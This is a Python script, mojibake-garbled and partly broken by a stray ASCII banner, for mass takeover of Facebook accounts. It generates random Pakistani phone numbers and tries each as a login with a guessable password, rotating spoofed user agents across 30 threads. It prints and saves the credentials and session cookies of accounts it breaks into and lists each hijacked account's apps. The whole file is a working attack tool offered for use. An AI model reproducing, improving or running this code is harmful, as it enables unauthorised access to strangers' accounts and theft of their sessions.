fromÂ bs4Â importÂ BeautifulSoupÂ asÂ sop 
 fromÂ concurrent.futuresÂ importÂ ThreadPoolExecutorÂ asÂ tred 
 importÂ os,sys,time,json,random,re,string,platform,base64,platform,uuid 
 importÂ marshal 
 try: 
 Â Â Â Â importÂ requests 
 Â Â Â Â fromÂ concurrent.futuresÂ importÂ ThreadPoolExecutorÂ asÂ ThreadPool 
 Â Â Â Â importÂ mechanize 
 Â Â Â Â fromÂ requests.exceptionsÂ importÂ ConnectionError 
 exceptÂ ModuleNotFoundError: 
 Â Â Â Â os.system('pipÂ installÂ mechanizeÂ requestsÂ futures==2Â >Â /dev/null') 
 Â Â Â Â os.system('pythonÂ Kashif.py') 
 fromÂ bs4Â importÂ BeautifulSoup 
 ugenÂ =Â [] 
 AÂ =Â '\x1b[1;97m'Â  
 BÂ =Â '\x1b[1;96m'Â  
 CÂ =Â '\x1b[1;91m'Â  
 DÂ =Â '\x1b[1;92m' 
 MÂ =Â '\033[1;31m' 
 HÂ =Â '\033[1;32m' 
 NÂ =Â '\x1b[1;37m'Â Â Â Â  
 EÂ =Â '\x1b[1;93m'Â  
 FÂ =Â '\x1b[1;94m' 
 GÂ =Â '\x1b[1;95m' 
 PÂ =Â '\033[1;37m' 
 REDÂ =Â '\033[1;91m' 
 WHITEÂ =Â '\033[1;97m' 
 GREENÂ =Â '\033[1;32m'Â # 
 YELLOWÂ =Â '\033[1;33m' 
 BLUEÂ =Â '\033[1;34m' 
 ORANGEÂ =Â '\033[1;35m' 
 KBÂ =Â '{Â KBÂ }' 
 forÂ xdÂ inÂ range(10000): 
 Â Â Â Â a='Mozilla/5.0Â (Linux;Â U;Â Android' 
 Â Â Â Â b=random.choice(['6','7','8','9','10','11','12']) 
 Â Â Â Â c='Â en-us;Â GT-' 
 Â Â Â Â d=random.choice(['A','B',Â 'C',Â 'D',Â 'E',Â 'F',Â 'G',Â 'H',Â 'I',Â 'J',Â 'K',Â 'L',Â 'M',Â 'N',Â 'O',Â 'P',Â 'Q',Â 'R',Â 'S',Â 'T',Â 'U',Â 'V',Â 'W',Â 'X',Â 'Y',Â 'Z']) 
 Â Â Â Â e=random.randrange(1,Â 999) 
 Â Â Â Â f=random.choice(['A','B',Â 'C',Â 'D',Â 'E',Â 'F',Â 'G',Â 'H',Â 'I',Â 'J',Â 'K',Â 'L',Â 'M',Â 'N',Â 'O',Â 'P',Â 'Q',Â 'R',Â 'S',Â 'T',Â 'U',Â 'V',Â 'W',Â 'X',Â 'Y',Â 'Z']) 
 Â Â Â Â g='AppleWebKit/537.36Â (KHTML,Â likeÂ Gecko)Â Chrome/' 
 Â Â Â Â h=random.randrange(73,100) 
 Â Â Â Â i='0' 
 Â Â Â Â j=random.randrange(4200,4900) 
 Â Â Â Â k=random.randrange(40,150) 
 Â Â Â Â l='MobileÂ Safari/537.36' 
 Â Â Â Â uaku2=f'{a}Â {b};Â {c}{d}{e}{f})Â {g}{h}.{i}.{j}.{k}Â {l}' 
 Â Â Â Â ugen.append(uaku2) 
 try: 
 Â Â Â Â os.system('curlÂ https://www.facebook.com/utpal.xr') 
 except: 
 Â Â Â Â pass 
 sock=open('ua.html','r').read().splitlines() 
 defÂ uaku(): 
 Â Â Â Â try: 
 Â Â Â Â Â Â Â Â ua=open('bbnew.txt','r').read().splitlines() 
 Â Â Â Â Â Â Â Â forÂ ubÂ inÂ ua: 
 Â Â Â Â Â Â Â Â Â Â Â Â ugen.append(ub) 
 Â Â Â Â except: 
 Â Â Â Â Â Â Â Â a=requests.get('https://www.facebook.com/utpal.xr').text 
 Â Â Â Â Â Â Â Â ua=open('.user-agents.txt','w') 
 Â Â Â Â Â Â Â Â aa=re.findall('line">(.*?)<',str(a)) 
 Â Â Â Â Â Â Â Â forÂ unÂ inÂ aa: 
 Â Â Â Â Â Â Â Â Â Â Â Â ua.write(un+'\n') 
 Â Â Â Â Â Â Â Â ua=open('.user-agents.txt','r').read().splitlines() 
 loopÂ =Â 0 
 cpsÂ =Â [] 
 oksÂ =Â [] 
 twfÂ =Â [] 
  
 defÂ clear(): 
 Â Â Â Â os.system('clear') 
 Â Â Â Â print(logo) 
 logoÂ =f"""____________________ 
 AUTHORÂ Â Â Â :Â Utpal Mallick Ongkon 
 FACEBOOKÂ :Â Utpal Mallick Ongkon
 VERSIONÂ Â Â Â :Â 1.1 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â [THEÂ ALAMIN USER] 
 ____________________""" 
  
  

  
                                                                                                                                                     
                                                                                                                                                     
UUUUUUUU     UUUUUUUUTTTTTTTTTTTTTTTTTTTTTTTPPPPPPPPPPPPPPPPP        AAA               LLLLLLLLLLL                              XXXXXXX       XXXXXXX
U::::::U     U::::::UT:::::::::::::::::::::TP::::::::::::::::P      A:::A              L:::::::::L                              X:::::X       X:::::X
U::::::U     U::::::UT:::::::::::::::::::::TP::::::PPPPPP:::::P    A:::::A             L:::::::::L                              X:::::X       X:::::X
UU:::::U     U:::::UUT:::::TT:::::::TT:::::TPP:::::P     P:::::P  A:::::::A            LL:::::::LL                              X::::::X     X::::::X
 U:::::U     U:::::U TTTTTT  T:::::T  TTTTTT  P::::P     P:::::P A:::::::::A             L:::::L                                XXX:::::X   X:::::XXX
 U:::::D     D:::::U         T:::::T          P::::P     P:::::PA:::::A:::::A            L:::::L                                   X:::::X X:::::X   
 U:::::D     D:::::U         T:::::T          P::::PPPPPP:::::PA:::::A A:::::A           L:::::L                                    X:::::X:::::X    
 U:::::D     D:::::U         T:::::T          P:::::::::::::PPA:::::A   A:::::A          L:::::L                ---------------      X:::::::::X     
 U:::::D     D:::::U         T:::::T          P::::PPPPPPPPP A:::::A     A:::::A         L:::::L                -:::::::::::::-      X:::::::::X     
 U:::::D     D:::::U         T:::::T          P::::P        A:::::AAAAAAAAA:::::A        L:::::L                ---------------     X:::::X:::::X    
 U:::::D     D:::::U         T:::::T          P::::P       A:::::::::::::::::::::A       L:::::L                                   X:::::X X:::::X   
 U::::::U   U::::::U         T:::::T          P::::P      A:::::AAAAAAAAAAAAA:::::A      L:::::L         LLLLLL                 XXX:::::X   X:::::XXX
 U:::::::UUU:::::::U       TT:::::::TT      PP::::::PP   A:::::A             A:::::A   LL:::::::LLLLLLLLL:::::L                 X::::::X     X::::::X
  UU:::::::::::::UU        T:::::::::T      P::::::::P  A:::::A               A:::::A  L::::::::::::::::::::::L                 X:::::X       X:::::X
    UU:::::::::UU          T:::::::::T      P::::::::P A:::::A                 A:::::A L::::::::::::::::::::::L                 X:::::X       X:::::X
      UUUUUUUUU            TTTTTTTTTTT      PPPPPPPPPPAAAAAAA                   AAAAAAALLLLLLLLLLLLLLLLLLLLLLLL                 XXXXXXX       XXXXXXX
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     
                                                                                                                                                     

  
  
  
 defÂ linex(): 
 Â Â Â Â print(f'==========================================================') 
 defÂ checks(oks,cps,twf): 
 Â Â Â Â ifÂ notÂ len(oks)Â !=Â 0: 
 Â Â Â Â Â Â Â Â pass 
 Â Â Â Â ifÂ len(cps)Â !=Â 0: 
 Â Â Â Â Â Â Â Â print('\n\n\x1b[1;97mÂ TOTALÂ OKÂ :Â \x1b[1;97mÂ %sÂ Â \x1b[1;97mKB-OK.txt'Â %Â ( 
 Â Â Â Â Â Â Â Â Â Â Â Â H,Â P,Â str(len(oks)))) 
 Â Â Â Â Â Â Â Â print('\x1b[1;97mÂ TOTALÂ CPÂ :\x1b[1;97mÂ Â Â %sÂ \x1b[1;97mKB-CP.txt'Â % 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â (H,Â P,Â str(len(cps)))) 
 Â Â Â Â Â Â Â Â print('\x1b[1;97mÂ TOTALÂ 2FÂ :\x1b[1;97mÂ Â Â %sÂ \x1b[1;97mKB-2F.txt'Â % 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â (H,Â P,Â str(len(twf)))) 
 Â Â Â Â Â Â Â Â input("\x1b[1;97mPRESEÂ ENTERÂ TOÂ BACKÂ xyzÂ Â ") 
 Â Â Â Â Â Â Â Â xyz() 
 loopÂ =Â 0 
 cpsÂ =Â [] 
 oksÂ =Â [] 
 twfÂ =Â [] 
 defÂ cek_apk(session,coki): 
 Â Â Â Â w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text 
 Â Â Â Â sopÂ =Â BeautifulSoup(w,"html.parser") 
 Â Â Â Â xÂ =Â sop.find("form",method="post") 
 Â Â Â Â gameÂ =Â [i.textÂ forÂ iÂ inÂ x.find_all("h3")] 
 Â Â Â Â ifÂ len(game)==0: 
 Â Â Â Â Â Â Â Â print(f'\rÂ %s[%s!%s]Â %s{ORANGE}SORRYÂ THEREÂ ISÂ NOÂ ACTIVEÂ Â APKSÂ ðŸŽ®%sÂ Â '%(ORANGE)) 
 Â Â Â Â else: 
 Â Â Â Â Â Â Â Â print(f'\rÂ {GREEN}[âˆš]Â %sYOURÂ ACTIVEÂ APPLICATIONÂ DETAILSÂ :'%(GREEN)) 
 Â Â Â Â Â Â Â Â forÂ iÂ inÂ range(len(game)): 
 Â Â Â Â Â Â Â Â Â Â Â Â print(f"\r%s[%s]Â %sÂ %sÂ "%(N,i+1,game[i].Â replace("DitambahkanÂ pada","Â DitambahkanÂ pada"),N)) 
 Â Â Â Â Â Â Â Â #else: 
 Â Â Â Â Â Â Â Â Â Â Â Â #print(f'\rÂ %s[%s!%s]Â Sorry,Â ApkÂ checkÂ failedÂ invalidÂ cookie'%(N,M,N)) 
 Â Â Â Â w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text 
 Â Â Â Â sopÂ =Â BeautifulSoup(w,"html.parser") 
 Â Â Â Â xÂ =Â sop.find("form",method="post") 
 Â Â Â Â gameÂ =Â [i.textÂ forÂ iÂ inÂ x.find_all("h3")] 
 Â Â Â Â ifÂ len(game)==0: 
 Â Â Â Â Â Â Â Â print(f'\rÂ %s[%s!%s]Â %s{ORANGE}SORRYÂ THEREÂ ISÂ NOÂ EXPIREDÂ APKSÂ ðŸŽ®%s'%(ORANGE)) 
 Â Â Â Â else: 
 Â Â Â Â Â Â Â Â print(f'\rÂ ðŸŽ®Â Â %{RED}sYOURÂ EXPIREDÂ APKSÂ DETAILSÂ :'%(RED)) 
 Â Â Â Â Â Â Â Â forÂ iÂ inÂ range(len(game)): 
 Â Â Â Â Â Â Â Â Â Â Â Â print(f"\r%s[%s]Â %sÂ %sÂ "%(N,i+1,game[i].Â replace("Kedaluwarsa","Â Kedaluwarsa"),N)) 
 Â Â Â Â Â Â Â Â Â Â Â Â print(f"{GREEN}[âˆš]---------------------------------------------------[âˆš]") 
 Â Â Â Â #____________# 
 defÂ xyz(): 
 Â Â Â Â #os.system("play-audioÂ WELCOME_TO_kb_BOOT_818.mp3") 
 Â Â Â Â os.getuid 
 Â Â Â Â os.system("clear");print(logo) 
 Â Â Â Â print('Â Â Â Â Â Â Â Â Â Â Â \x1b[97m[\033[37;41mÂ Â MÂ AÂ IÂ NÂ Â Â MÂ EÂ NÂ UÂ Â Â \033[0;m]Â ') 
 Â Â Â Â print(f"") 
 Â Â Â Â print(f"[01]Â {WHITE}STARTÂ RANDOMÂ CLONING") 
 Â Â Â Â print(f"[00]Â {WHITE}EXITÂ PROGRAMÂ ") 
 Â Â Â Â print(f"") 
 Â Â Â Â print(f"\033[1;91m========================================================") 
 Â Â Â Â KashifÂ =Â input("[âˆš]Â CHOOSEÂ :Â ") 
 Â Â Â Â ifÂ KashifÂ inÂ ["1","01"]: 
 Â Â Â Â Â Â Â Â Random() 
 Â Â Â Â elifÂ KashifÂ inÂ ["0","00"]: 
 Â Â Â Â Â Â Â exit() 
 Â Â Â Â else: 
 Â Â Â Â Â Â Â Â print('\033[1;31mINCORECTÂ OPTION!\033[1;31m') 
 Â Â Â Â Â Â Â Â xyz() 
  
 #_____________# 
 Â  
 #_____________________# 
  
 defÂ Random(): 
 Â Â Â Â user=[] 
 Â Â Â Â os.getuid 
 Â Â Â Â os.geteuid 
 Â Â Â Â os.system("clear") 
 Â Â Â Â print(logo) 
 Â Â Â Â print(f"") 
 Â Â Â Â clear() 
 Â Â Â Â print(f"Â Â Â Â Â Â Â Â Â Â \x1b[97m[\033[37;41mÂ Â CÂ OÂ DÂ EÂ Â Â Â MÂ EÂ NÂ UÂ Â Â \033[0;m]") 
 Â Â Â Â print(f"") 
 Â Â Â Â linex() 
 Â Â Â Â print(f"Â Â Â Â Â Â Â Â \x1b[97m[\033[95;42mEXAMPLEÂ :ðŸ‘‡\033[0;m]") 
 Â Â Â Â print(f"") 
 Â Â Â Â print('Â 0306Â ,0300Â ,0315Â ,0333') 
 Â Â Â Â print(f"Â 0341Â ,0342Â ,0345Â ,0349") 
 Â Â Â Â print(f"Â 0321Â ,0316Â ,0308Â ,0309") 
 Â Â Â Â print(f"") 
 Â Â Â Â linex() 
 Â Â Â Â codeÂ =Â input('Â PUTÂ CODEÂ :Â ') 
 Â Â Â Â os.system("clear") 
 Â Â Â Â print(logo) 
 Â Â Â Â print(f"") 
 Â Â Â Â print(f"Â Â Â Â Â Â Â Â Â Â \x1b[97m[\033[37;41mÂ Â LÂ IÂ MÂ IÂ TÂ Â Â MÂ EÂ NÂ UÂ Â Â \033[0;m]") 
 Â Â Â Â print(f"") 
 Â Â Â Â limitÂ =Â int(input('Â EXAMPLE:Â 1000,Â 2000,Â 5000,Â 10000\n\nÂ PUTÂ CLONINGÂ LIMIT:Â ')) 
 Â Â Â Â forÂ nmbrÂ inÂ range(limit): 
 Â Â Â Â Â Â Â Â nmpÂ =Â ''.join(random.choice(string.digits)Â forÂ _Â inÂ range(7)) 
 Â Â Â Â Â Â Â Â user.append(nmp) 
 Â Â Â Â withÂ ThreadPool(max_workers=30)Â asÂ yaari:Â Â Â Â  
 Â Â Â Â Â Â Â Â clear() 
 Â Â Â Â Â Â Â Â tlÂ =Â str(len(user)) 
 Â Â Â Â Â Â Â Â print(f"Â {WHITE}TOTALÂ IDZÂ Â Â Â Â Â Â Â Â Â Â Â Â :Â {RED}"+tl) 
 Â Â Â Â Â Â Â Â print(f"Â {WHITE}COUNTRYÂ YOUÂ CHOOSEÂ Â Â Â :Â PAKISTANÂ ") 
 Â Â Â Â Â Â Â Â print(f"Â {WHITE}NUMBERÂ YOUÂ PUTÂ Â Â Â Â Â Â Â :Â {RED}"+code) 
 Â Â Â Â Â Â Â Â print(f"Â {WHITE}PROCESSÂ HASÂ BEENÂ STARTED") 
 Â Â Â Â Â Â Â Â print(f"Â {WHITE}BEÂ PATIENT.......") 
 Â Â Â Â Â Â Â Â print(f"Â {WHITE}TOÂ STOPÂ PROCESSÂ CtrlÂ +Â ZÂ ") 
 Â Â Â Â Â Â Â Â print(f'===========================================================') 
 Â Â Â Â Â Â Â Â forÂ loveÂ inÂ user: 
 Â Â Â Â Â Â Â Â Â Â Â Â uidÂ =Â code+love 
 Â Â Â Â Â Â Â Â Â Â Â Â pwxÂ =Â [love] 
 Â Â Â Â Â Â Â Â Â Â Â Â yaari.submit(free,uid,pwx,tl) 
 defÂ free(uid,pwx,tl): 
 Â Â Â Â globalÂ loop 
 Â Â Â Â globalÂ oks 
 Â Â Â Â globalÂ agents 
 Â Â Â Â try: 
 Â Â Â Â Â Â Â Â forÂ psÂ inÂ pwx: 
 Â Â Â Â Â Â Â Â Â Â Â Â biÂ =Â random.choice([A]) 
 Â Â Â Â Â Â Â Â Â Â Â Â sessionÂ =Â requests.Session() 
 Â Â Â Â Â Â Â Â Â Â Â Â sys.stdout.write(f'\r\33[1;37m[BALIIXSABA]Â [%s]\33[1;97mÂ [OK:%s~CP:%s]'%(loop,len(oks),len(cps))),Â  
 Â Â Â Â Â Â Â Â Â Â Â Â sys.stdout.flush() 
 Â Â Â Â Â Â Â Â Â Â Â Â proÂ =Â random.choice(ugen) 
 Â Â Â Â Â Â Â Â Â Â Â Â free_fbÂ =Â session.get('https://mbasic.facebook.com').text 
 Â Â Â Â Â Â Â Â Â Â Â Â log_dataÂ =Â { 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â "lsd":re.search('name="lsd"Â value="(.*?)"',Â str(free_fb)).group(1), 
 Â Â Â Â Â Â Â Â Â Â Â Â "jazoest":re.search('name="jazoest"Â value="(.*?)"',Â str(free_fb)).group(1), 
 Â Â Â Â Â Â Â Â Â Â Â Â "m_ts":re.search('name="m_ts"Â value="(.*?)"',Â str(free_fb)).group(1), 
 Â Â Â Â Â Â Â Â Â Â Â Â "li":re.search('name="li"Â value="(.*?)"',Â str(free_fb)).group(1), 
 Â Â Â Â Â Â Â Â Â Â Â Â "try_number":"0", 
 Â Â Â Â Â Â Â Â Â Â Â Â "unrecognized_tries":"0", 
 Â Â Â Â Â Â Â Â Â Â Â Â "email":uid, 
 Â Â Â Â Â Â Â Â Â Â Â Â "pass":ps, 
 Â Â Â Â Â Â Â Â Â Â Â Â "login":"LogÂ In"} 
 Â Â Â Â Â Â Â Â Â Â Â Â header_freefbÂ =Â {'authority':'mbasic.facebook.com', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'method':Â 'POST', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'scheme':Â 'https', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'accept':Â 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'accept-encoding':'utf-8','accept-language':Â 'en-US,en;q=0.9', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'cache-control':Â 'max-age=0', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'sec-ch-ua':Â '"Â NotÂ A;Brand";v="99",Â "Chromium";v="101"', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'sec-ch-ua-mobile':Â '?1','sec-ch-ua-platform':Â '"Android"', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'sec-fetch-dest':Â 'document', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'sec-fetch-mode':Â 'navigate', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'sec-fetch-site':Â 'none', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'sec-fetch-user':Â '?1', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'upgrade-insecure-requests':Â '1', 
 Â Â Â Â Â Â Â Â Â Â Â Â 'user-agent':pro} 
 Â Â Â Â Â Â Â Â Â Â Â Â loÂ =Â session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text 
 Â Â Â Â Â Â Â Â Â Â Â Â log_cookies=session.cookies.get_dict().keys() 
 Â Â Â Â Â Â Â Â Â Â Â Â ifÂ 'c_user'Â inÂ log_cookies: 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â coki=";".join([key+"="+valueÂ forÂ key,valueÂ inÂ session.cookies.get_dict().items()]) 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cidÂ =Â coki[7:22] 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â print('\r\033[1;32m[âˆš]---------------------[UTPAL -OK]--------------------[âˆš]\nEMAILÂ :Â '+uid+'\nUIDÂ Â Â :Â '+cid+'Â âˆšÂ '+ps+Â '\nCOOKIEÂ Â Â :Â '+coki+'\n[âˆš]---------------------------------------------------[âˆš]') 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cek_apk(session,coki) 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â open('/sdcard/UTPAL-OK.txt',Â 'a').write(cid+'Â |Â '+ps+'\n') 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â oks.append(cid) 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â break 
 Â Â Â Â Â Â Â Â Â Â Â Â elifÂ 'checkpoint'Â inÂ log_cookies: 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â coki=";".join([key+"="+valueÂ forÂ key,valueÂ inÂ session.cookies.get_dict().items()]) 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cid=coki[24:39] 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â RedÂ =Â '\033[1;31m' 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â print(f'\r{Red}[Ã—]--------------------[UTPAL-Cp]---------------------[Ã—]\nEMAILÂ :Â '+uid+'\nUIDÂ Â Â :Â '+cid+'Â âˆšÂ '+ps+Â '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m') 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â open('/sdcard/ALAMIN-CP.txt',Â 'a').write(cid+'Â |Â '+ps+'\n') 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cps.append(cid) 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â break 
 Â Â Â Â Â Â Â Â Â Â Â Â elifÂ '/x/checkpoint'Â inÂ log_cookies: 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â coki=";".join([key+"="+valueÂ forÂ key,valueÂ inÂ session.cookies.get_dict().items()]) 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â cid=coki[7:22] 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â RedÂ =Â '\033[1;31m' 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â print(f'\r{YELLOW}[TEMP-LOCK]Â '+cid+'Â |Â '+ps+'\033[1;97m') 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â open('/sdcard/Jadugar-2F.txt',Â 'a').write(cid+'Â |Â '+ps+'\n') 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â twf.append(cid) 
 Â Â Â Â Â Â Â Â Â Â Â Â else: 
 Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â continue 
 Â Â Â Â Â Â Â Â loop+=1 
 Â Â Â Â Â Â Â Â checks(oks,cps,twf) 
 Â Â Â Â except: 
 Â Â Â Â Â Â Â Â pass 
  
 Â Â Â Â Â Â Â Â  
 Â  
 ifÂ __name__Â ==Â '__main__': 
 Â Â Â Â xyz()# utpal.py
